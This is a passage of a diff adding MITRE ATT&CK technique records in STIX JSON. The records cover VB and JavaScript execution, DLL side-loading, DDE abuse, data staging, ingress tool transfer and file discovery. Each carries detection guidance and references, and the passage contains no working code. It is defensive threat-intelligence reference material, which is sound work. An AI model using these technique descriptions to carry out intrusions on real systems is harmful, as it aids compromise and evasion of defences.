+                    "description": "Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018.",
+                    "source_name": "SilentBreak Offensive PS Dec 2015"
+                },
+                {
+                    "url": "https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/",
+                    "description": "Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019.",
+                    "source_name": "Microsoft PSfromCsharp APR 2014"
+                },
+                {
+                    "source_name": "Malware Archaeology PowerShell Cheat Sheet",
+                    "description": "Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.",
+                    "url": "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf"
+                },
+                {
+                    "source_name": "FireEye PowerShell Logging 2016",
+                    "description": "Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016.",
+                    "url": "https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2021-08-16T21:03:21.051Z",
+            "name": "Visual Basic",
+            "x_mitre_data_sources": [
+                "Command: Command Execution",
+                "Process: Process Creation",
+                "Module: Module Load",
+                "Script: Script Execution"
+            ],
+            "x_mitre_version": "1.2",
+            "created": "2020-03-09T14:29:51.508Z",
+            "x_mitre_permissions_required": [
+                "User",
+                "Administrator",
+                "SYSTEM"
+            ],
+            "x_mitre_platforms": [
+                "Windows",
+                "macOS",
+                "Linux"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
+            "description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads.",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "execution"
+                }
+            ],
+            "x_mitre_detection": "Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1059/005",
+                    "external_id": "T1059.005",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://devblogs.microsoft.com/vbteam/visual-basic-support-planned-for-net-5-0/",
+                    "description": ".NET Team. (2020, March 11). Visual Basic support planned for .NET 5.0. Retrieved June 23, 2020.",
+                    "source_name": "VB .NET Mar 2020"
+                },
+                {
+                    "url": "https://docs.microsoft.com/dotnet/visual-basic/",
+                    "description": "Microsoft. (n.d.). Visual Basic documentation. Retrieved June 23, 2020.",
+                    "source_name": "VB Microsoft"
+                },
+                {
+                    "url": "https://docs.microsoft.com/office/vba/api/overview/",
+                    "description": "Microsoft. (2019, June 11). Office VBA Reference. Retrieved June 23, 2020.",
+                    "source_name": "Microsoft VBA"
+                },
+                {
+                    "url": "https://en.wikipedia.org/wiki/Visual_Basic_for_Applications",
+                    "description": "Wikipedia. (n.d.). Visual Basic for Applications. Retrieved August 13, 2020.",
+                    "source_name": "Wikipedia VBA"
+                },
+                {
+                    "url": "https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85)",
+                    "description": "Microsoft. (2011, April 19). What Is VBScript?. Retrieved March 28, 2020.",
+                    "source_name": "Microsoft VBScript"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2021-08-16T21:02:05.142Z",
+            "name": "JavaScript",
+            "x_mitre_data_sources": [
+                "Command: Command Execution",
+                "Process: Process Creation",
+                "Module: Module Load",
+                "Script: Script Execution"
+            ],
+            "x_mitre_version": "2.1",
+            "created": "2020-06-23T19:12:24.924Z",
+            "x_mitre_contributors": [
+                "Cody Thomas, SpecterOps"
+            ],
+            "x_mitre_permissions_required": [
+                "User",
+                "Administrator",
+                "SYSTEM"
+            ],
+            "x_mitre_platforms": [
+                "Windows",
+                "macOS",
+                "Linux"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
+            "description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "execution"
+                }
+            ],
+            "x_mitre_detection": "Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nMonitor for execution of JXA through <code>osascript</code> and usage of <code>OSAScript</code> API that may be related to other suspicious behavior occurring on the system.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1059/007",
+                    "external_id": "T1059.007",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://nodejs.org/",
+                    "description": "OpenJS Foundation. (n.d.). Node.js. Retrieved June 23, 2020.",
+                    "source_name": "NodeJS"
+                },
+                {
+                    "url": "https://docs.microsoft.com/windows/win32/com/translating-to-jscript",
+                    "description": "Microsoft. (2018, May 31). Translating to JScript. Retrieved June 23, 2020.",
+                    "source_name": "JScrip May 2018"
+                },
+                {
+                    "url": "https://docs.microsoft.com/archive/blogs/gauravseth/the-world-of-jscript-javascript-ecmascript",
+                    "description": "Microsoft. (2007, August 15). The World of JScript, JavaScript, ECMAScript \u2026. Retrieved June 23, 2020.",
+                    "source_name": "Microsoft JScript 2007"
+                },
+                {
+                    "url": "https://docs.microsoft.com/scripting/winscript/windows-script-interfaces",
+                    "description": "Microsoft. (2017, January 18). Windows Script Interfaces. Retrieved June 23, 2020.",
+                    "source_name": "Microsoft Windows Scripts"
+                },
+                {
+                    "url": "https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/index.html",
+                    "description": "Apple. (2016, June 13). About Mac Scripting. Retrieved April 14, 2021.",
+                    "source_name": "Apple About Mac Scripting 2016"
+                },
+                {
+                    "url": "https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5",
+                    "description": "Pitt, L. (2020, August 6). Persistent JXA. Retrieved April 14, 2021.",
+                    "source_name": "SpecterOps JXA 2020"
+                },
+                {
+                    "url": "https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/",
+                    "description": "Phil Stokes. (2019, December 5). macOS Red Team: Calling Apple APIs Without Building Binaries. Retrieved July 17, 2020.",
+                    "source_name": "SentinelOne macOS Red Team"
+                },
+                {
+                    "url": "https://redcanary.com/blog/clipping-silver-sparrows-wings/",
+                    "description": "Tony Lambert. (2021, February 18). Clipping Silver Sparrow\u2019s wings: Outing macOS malware before it takes flight. Retrieved April 20, 2021.",
+                    "source_name": "Red Canary Silver Sparrow Feb2021"
+                },
+                {
+                    "url": "https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/",
+                    "description": "Dominic Chell. (2021, January 1). macOS Post-Exploitation Shenanigans with VSCode Extensions. Retrieved April 20, 2021.",
+                    "source_name": "MDSec macOS JXA and VSCode"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Local Data Staging",
+            "x_mitre_data_sources": [
+                "File: File Access",
+                "File: File Creation",
+                "Command: Command Execution"
+            ],
+            "x_mitre_version": "1.0",
+            "modified": "2020-05-26T19:23:54.854Z",
+            "created": "2020-03-13T21:13:10.467Z",
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
+            "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "collection"
+                }
+            ],
+            "x_mitre_detection": "Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1074/001",
+                    "external_id": "T1074.001",
+                    "source_name": "mitre-attack"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Exploitation for Client Execution",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1203",
+                    "external_id": "T1203",
+                    "source_name": "mitre-attack"
+                }
+            ],
+            "x_mitre_version": "1.2",
+            "modified": "2021-10-15T19:01:34.932Z",
+            "x_mitre_system_requirements": [
+                "Remote exploitation for execution requires a remotely accessible service reachable over the network or other vector of access such as spearphishing or drive-by compromise."
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "execution"
+                }
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "Windows",
+                "macOS"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "id": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
+            "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
+            "x_mitre_remote_support": false,
+            "x_mitre_detection": "Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.",
+            "created": "2018-04-18T17:59:24.739Z",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "File and Directory Discovery",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1083",
+                    "external_id": "T1083",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/127.html",
+                    "external_id": "CAPEC-127",
+                    "source_name": "capec"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/497.html",
+                    "external_id": "CAPEC-497",
+                    "source_name": "capec"
+                },
+                {
+                    "source_name": "Windows Commands JPCERT",
+                    "description": "Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016.",
+                    "url": "https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html"
+                }
+            ],
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "Command: Command Execution",
+                "Process: OS API Execution"
+            ],
+            "x_mitre_version": "1.3",
+            "modified": "2021-08-23T20:44:32.048Z",
+            "x_mitre_system_requirements": [
+                "Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls"
+            ],
+            "id": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18",
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_permissions_required": [
+                "User",
+                "Administrator",
+                "SYSTEM"
+            ],
+            "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106).",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "discovery"
+                }
+            ],
+            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
+            "created": "2017-05-31T21:31:04.710Z",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2021-04-26T18:31:34.954Z",
+            "name": "DLL Side-Loading",
+            "x_mitre_data_sources": [
+                "File: File Creation",
+                "File: File Modification",
+                "Module: Module Load",
+                "Process: Process Creation"
+            ],
+            "x_mitre_version": "2.0",
+            "created": "2020-03-13T19:41:37.908Z",
+            "x_mitre_defense_bypassed": [
+                "Anti-virus",
+                "Application control"
+            ],
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
+            "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "persistence"
+                },
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "privilege-escalation"
+                },
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "x_mitre_detection": "Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so) as well as the introduction of new files/programs. Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1574/002",
+                    "external_id": "T1574.002",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "url": "https://capec.mitre.org/data/definitions/641.html",
+                    "external_id": "CAPEC-641",
+                    "source_name": "capec"
+                },
+                {
+                    "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf",
+                    "description": "Amanda Steward. (2014). FireEye DLL Side-Loading: A Thorn in the Side of the Anti-Virus Industry. Retrieved March 13, 2020.",
+                    "source_name": "FireEye DLL Side-Loading"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2020-03-20T15:42:48.595Z",
+            "name": "Ingress Tool Transfer",
+            "x_mitre_data_sources": [
+                "Network Traffic: Network Traffic Flow",
+                "Network Traffic: Network Connection Creation",
+                "Network Traffic: Network Traffic Content",
+                "File: File Creation"
+            ],
+            "x_mitre_version": "2.0",
+            "created": "2017-05-31T21:31:16.408Z",
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
+            "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "command-and-control"
+                }
+            ],
+            "x_mitre_detection": "Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1105",
+                    "external_id": "T1105",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "source_name": "University of Birmingham C2",
+                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
+                }
+            ]
+        },
+        {
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "type": "attack-pattern",
+            "name": "Dynamic Data Exchange",
+            "x_mitre_data_sources": [
+                "Module: Module Load",
+                "Process: Process Creation",
+                "Script: Script Execution"
+            ],
+            "x_mitre_version": "1.1",
+            "modified": "2021-07-26T22:52:04.196Z",
+            "created": "2020-02-12T14:10:50.699Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "execution"
+                }
+            ],
+            "id": "attack-pattern--232a7e42-cd6e-4902-8fe9-2960f529dd4d",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "description": "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)\n\nMicrosoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)",
+            "x_mitre_remote_support": true,
+            "x_mitre_detection": "Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).\n\nOLE and Office Open XML files can be scanned for \u2018DDEAUTO', \u2018DDE\u2019, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "external_references": [
+                {
+                    "url": "https://attack.mitre.org/techniques/T1559/002",
+                    "external_id": "T1559.002",
+                    "source_name": "mitre-attack"
+                },
+                {
+                    "source_name": "BleepingComputer DDE Disabled in Word Dec 2017",
+                    "description": "Cimpanu, C. (2017, December 15). Microsoft Disables DDE Feature in Word to Prevent Further Malware Attacks. Retrieved December 19, 2017.",
+                    "url": "https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/"
+                },
+                {
+                    "source_name": "Microsoft ADV170021 Dec 2017",
+                    "description": "Microsoft. (2017, December 12). ADV170021 - Microsoft Office Defense in Depth Update. Retrieved February 3, 2018.",
+                    "url": "https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021"
+                },
+                {
+                    "source_name": "Microsoft DDE Advisory Nov 2017",
+                    "description": "Microsoft. (2017, November 8). Microsoft Security Advisory 4053440 - Securely opening Microsoft Office documents that contain Dynamic Data Exchange (DDE) fields. Retrieved November 21, 2017.",
+                    "url": "https://technet.microsoft.com/library/security/4053440"
+                },
+                {
+                    "source_name": "SensePost PS DDE May 2016",
+                    "description": "El-Sherei, S. (2016, May 20). PowerShell, C-Sharp and DDE The Power Within. Retrieved November 22, 2017.",
+                    "url": "https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/"
+                },
+                {
+                    "source_name": "Kettle CSV DDE Aug 2014",
+                    "description": "Kettle, J. (2014, August 29). Comma Separated Vulnerabilities. Retrieved November 22, 2017.",
+                    "url": "https://www.contextis.com/blog/comma-separated-vulnerabilities"
+                },
+                {
+                    "source_name": "Enigma Reviving DDE Jan 2018",
+                    "description": "Nelson, M. (2018, January 29). Reviving DDE: Using OneNote and Excel for Code Execution. Retrieved February 3, 2018.",
+                    "url": "https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee"
+                },
+                {
+                    "source_name": "SensePost MacroLess DDE Oct 2017",
+                    "description": "Stalmans, E., El-Sherei, S. (2017, October 9). Macro-less Code Exec in MSWord. Retrieved November 21, 2017.",
+                    "url": "https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/"
+                },
+                {
+                    "url": "https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html",
+                    "description": "Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.",
+                    "source_name": "Fireeye Hunting COM June 2019"
+                },
+                {
+                    "source_name": "NVisio Labs DDE Detection Oct 2017",
+                    "description": "NVISO Labs. (2017, October 11). Detecting DDE in MS Office documents. Retrieved November 21, 2017.",
+                    "url": "https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/"
+                }
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "modified": "2021-04-20T19:23:37.762Z",
+            "name": "Match Legitimate Name or Location",
+            "x_mitre_data_sources": [
+                "Image: Image Metadata",
+                "File: File Metadata",
+                "Process: Process Metadata"
+            ],
+            "x_mitre_version": "1.1",
+            "created": "2020-02-10T20:43:10.239Z",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "x_mitre_defense_bypassed": [
+                "Application control by file name or path"
+            ],
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows",
+                "Containers"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "id": "attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2",
